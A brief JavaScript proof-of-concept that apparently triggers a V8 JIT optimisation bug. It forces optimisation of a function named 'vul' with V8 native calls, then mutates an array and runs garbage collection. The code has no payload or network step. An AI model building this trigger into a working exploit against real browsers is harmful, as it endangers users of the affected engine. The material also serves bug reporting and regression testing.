function vul() {
    const arr = Array(1000);
    function inlined_func() {
        try {
            const err_obj = { e: p4nda, length: arr };
        } catch(e9) {
            return e9;
        }
    }
    for (let i11 = 0; i11 < 25; i11++) {
        inlined_func();
    }
    var res = inlined_func();
    const v20 = {};
    /p4nda/.test(v20);
    arr.shift();
    return res;
}
const v24 = %PrepareFunctionForOptimization(vul);
vul();
vul();
const v27 = %OptimizeFunctionOnNextCall(vul);
var res = vul();
gc();
gc();
